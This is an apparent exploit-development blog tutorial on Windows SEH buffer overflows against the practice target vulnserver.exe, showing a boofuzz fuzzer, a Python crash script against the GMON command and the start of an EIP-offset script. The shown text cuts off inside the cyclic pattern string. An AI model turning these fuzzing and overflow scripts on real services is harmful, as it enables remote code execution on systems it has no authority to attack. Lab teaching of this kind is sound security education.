<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Windows User Mode Exploit Development: Structured Exception Handler (SEH) Part 2 - memN0ps</title>
  <meta name="description" content="Structured Exception Handler Let&rsquo;s go through this again from Windows User Mode Exploit Development Part 1
What is a Buffer Overflow? A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers.">
  <meta name="author" content="memN0ps"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "memN0ps",
    
    "url": "https:\/\/memn0ps.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/memn0ps.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/memn0ps.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/memn0ps.github.io\/Windows-User-Mode-Exploit-Development-SEH-Part-2\/",
          "name": "Windows user mode exploit development structured exception handler ( seh) part 2"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "memN0ps"
  },
  "headline": "Windows User Mode Exploit Development: Structured Exception Handler (SEH) Part 2",
  "description" : "Structured Exception Handler Let\u0026rsquo;s go through this again from Windows User Mode Exploit Development Part 1\nWhat is a Buffer Overflow? A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers.",
  "inLanguage" : "en",
  "wordCount":  3220 ,
  "datePublished" : "2020-01-27T00:00:00",
  "dateModified" : "2020-01-27T00:00:00",
  "image" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
  "keywords" : [ "" ],
  "mainEntityOfPage" : "https:\/\/memn0ps.github.io\/Windows-User-Mode-Exploit-Development-SEH-Part-2\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/memn0ps.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="Windows User Mode Exploit Development: Structured Exception Handler (SEH) Part 2" />
<meta property="og:description" content="Structured Exception Handler Let&rsquo;s go through this again from Windows User Mode Exploit Development Part 1
What is a Buffer Overflow? A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers.">
<meta property="og:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
<meta property="og:url" content="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-SEH-Part-2/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="memN0ps" />

  <meta name="twitter:title" content="Windows User Mode Exploit Development: Structured Exception Handler …" />
  <meta name="twitter:description" content="Structured Exception Handler Let&rsquo;s go through this again from Windows User Mode Exploit Development Part 1
What is a Buffer Overflow? A buffer overflow is when an application attempts to write …">
  <meta name="twitter:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@memN0ps" />
  <meta name="twitter:creator" content="@memN0ps" />
  <link href='https://memn0ps.github.io/avatar-icon.jpg' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.93.1" />
  <link rel="alternate" href="https://memn0ps.github.io/index.xml" type="application/rss+xml" title="memN0ps"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://memn0ps.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://memn0ps.github.io/css/syntax.css" /><link rel="stylesheet" href="https://memn0ps.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://memn0ps.github.io/">memN0ps</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="memN0ps" href="https://memn0ps.github.io/">
            <img class="avatar-img" src="https://memn0ps.github.io/avatar-icon.jpg" alt="memN0ps" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>Windows User Mode Exploit Development: Structured Exception Handler (SEH) Part 2</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on January 27, 2020
  
  
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;memN0ps
    
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <h1 id="structured-exception-handler">Structured Exception Handler</h1>
<p>Let&rsquo;s go through this again from <strong><a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Part-1/">Windows User Mode Exploit Development Part 1</a></strong></p>
<h2 id="what-is-a-buffer-overflow">What is a Buffer Overflow?</h2>
<p>A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.</p>
<p>Here we will be discussing a SEH buffer overflow without any memory protections such as DEP or ASLR. Bypassing DEP and ASLR will be addressed in the upcoming blogs.</p>
<h2 id="what-is-structured-exception-handling-seh">What is Structured Exception Handling (SEH)?</h2>
<p>Structured exception handling is a Windows mechanism for dealing with hardware and software exceptions using a data structure called a linked list. A linked list is a collection of nodes which together represent a sequence, each node points to the next node, and every node contains a reference and data.</p>
<p>Example</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Block of protected code
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">catch</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// code to execute when an exception occurs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>When an exception occurs the operating system goes through the SEH Chain, and each Structured Exception Handler (SEH) is analysed by calling the exception callback function, inspecting the details found in the exception and content records, to see if it can handle the exception. However, if the exception fails to be handled then <code>ExceptionContinueSearch</code> function is returned, and the operating system moves to the address of the next record pointed to by <code>Next SEH</code>, continuing down the SEH chain until it finds a suitable exception handler or reaches the last, default handler (FFFFFFFF).</p>
<p>Here is an image that explains the SEH Chain.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Explain_SEH.png" alt=""></p>
<p><strong>Credits to (<a href="https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/">Securitysift</a>)</strong></p>
<h2 id="objective">Objective</h2>
<p>As discussed before, usually the objective of a buffer overflow is to get remote code execution by controlling the EIP register (x86 or 32 bit). The EIP register is the instruction pointer which tells the CPU to execute the instructions it’s pointing at. Once we have control of this register, we can redirect the execution flow of the program to our liking, which can be malicious shellcode that sends a connection back aka reverse shell. However, many problems can be faced during this objective.</p>
<p>This brings me to my next point.</p>
<p>The &ldquo;Exception Registration Record&rdquo; (SEH) is a pointer to the current record and the &ldquo;Next Exception Registration Record&rdquo; is a pointer to the next record (nSEH).</p>
<p>When an exception occurs we will see that these records are reversed <code>[nSEH] -&gt; [SEH]</code>, since windows stack grows downwards and <code>SEH</code> will be located at <code>ESP + 8</code>.</p>
<p>When we overwrite a Structured Exception Handler, windows will zero out the CPU registers, so we won&rsquo;t be able to jump to our shellcode directly, this is a protection mechanism by windows which is luckily flawed.</p>
<p>The way to bypass this flawed mechanism is to overwrite SEH with a pointer to <code>POP POP RET</code> instruction. The first POP instruction removes 4-bytes from the top of the stack and the second POP remove another 4-bytes from the top of the stack, the RET instruction will return execution to the top of the stack.</p>
<p>We need to keep in mind that SEH is located at <code>ESP + 8</code> so incrementing the stack with 8-bytes and returning to the new pointer at the top of the stack will cause us to execute  <code>nSEH</code>.</p>
<p>In this scenario, we will only have 4 bytes of space at nSEH which we will use to place a short jump back (<code>JMP SHORT</code>) into our buffer then we will have around 45 bytes to play around with. We will use those 45 bytes to place a 17-byte 2nd stage payload which will make a longer jump back into our buffer and give us around 512 bytes to place our reverse shell.</p>
<p>There is a better way of doing this which is called an egg hunter, however, we won&rsquo;t cover that in this blog, maybe the next :)</p>
<p>This should give you a good picture of what we are about to do.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/SEH_Exploit_Buffer.png" alt=""></p>
<p><strong>Credits to (<a href="https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/">Securitysift</a>)</strong></p>
<p>Let&rsquo;s see this in practice.</p>
<h2 id="fuzzing">Fuzzing</h2>
<p>Fuzzing is sending a large amount of buffer with malformed data into the user input field and observe the application for unexpected crashes.</p>
<p>We will be fuzzing a parameter for <code>vulserver.exe</code> which is <code>GMON</code>. After a bit of fuzzing the GMON parameter appears to be vulnerable to an SEH overwrite.</p>
<p>The string <code>GMON /.../</code> and 5012 A&rsquo;s crashed the application. You can observe this using wireshark/tcpdump.</p>
<p>I usually use Spike or Boofuzz. Boofuzz gives some very detailed output and even has a web portal.</p>
<p>Here is the boofuzz fuzzing exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">boofuzz</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Target IP</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.81.129&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Target port</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Protocol</span>
</span></span><span class="line"><span class="cl"><span class="n">protocol</span> <span class="o">=</span> <span class="s2">&#34;tcp&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">Target</span><span class="p">(</span><span class="n">connection</span> <span class="o">=</span> <span class="n">SocketConnection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="n">protocol</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">#Give our session a name, &#34;GMON&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_initialize</span><span class="p">(</span><span class="s2">&#34;GMON&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">#First block of our request</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_string</span><span class="p">(</span><span class="s2">&#34;GMON&#34;</span><span class="p">,</span> <span class="n">fuzzable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#Next block of our request which contains a space that is needed between command and value.</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_delim</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="n">fuzzable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#This block represents the value for the command and boofuzz will fuzz this</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_string</span><span class="p">(</span><span class="s2">&#34;FUZZ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#Connect to the server</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">s_get</span><span class="p">(</span><span class="s2">&#34;GMON&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#Start fuzzing</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>You can find fuzzing resources here.</p>
<ul>
<li><a href="https://github.com/secfigo/Awesome-Fuzzing">https://github.com/secfigo/Awesome-Fuzzing</a></li>
</ul>
<h2 id="replicating-crash">Replicating Crash</h2>
<p>After attaching the debugger to the process, we can see the process appears to be running.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Normal_Debugger.png" alt=""></p>
<p>We send the exploit to trigger the buffer overflow.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">5012</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Payload length: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;GMON /.../&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Exploit sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></div><p>After sending the exploit, we have a crash. When the crash occurs, the application gets redirected to the Structured Exception handler which we have overwritten with 41414141 (4 A&rsquo;s).</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/First_Crash.png" alt=""></p>
<p>Let&rsquo;s view the SEH chain. Clicking <code>View -&gt; SEH Chains</code> or simply pressing <code>ALT + s</code> reveals a vanilla SEH overwrite. Here we  can see our 4 A&rsquo;s</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/SEH_Chain.png" alt=""></p>
<p>Let&rsquo;s allow the exception to occur by pressing <code>Shift + F7/F8/f9</code></p>
<p>The interesting thing about these types of exploits is the location of the buffer after the crash, most commonly in Structured Exception Handlers, you will find your buffer on the stack, as shown in the screenshot.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Vanilla_SEH_Overwrite.png" alt=""></p>
<p>To get to our buffer, rather than trying to jump at registers such as <code>JMP ESP</code> or <code>JMP EBX</code> we will try to find a sequence of instructions which will lead us to our C&rsquo;s.</p>
<p>So ideally we should be looking for a <code>POP POP RET</code>, which will POP the first value off the stack then the second value off the stack and then return to our user-controlled buffer.</p>
<p>Before we start looking for a POP POP RET, let&rsquo;s get control of the EIP register as usual.</p>
<h2 id="controlling-eip">Controlling EIP</h2>
<p>Here we will generate a unique pattern of 5012 bytes.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-SEH-Part-2/Pattern.png" alt=""></p>
<p>Modify and send the exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.81.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9E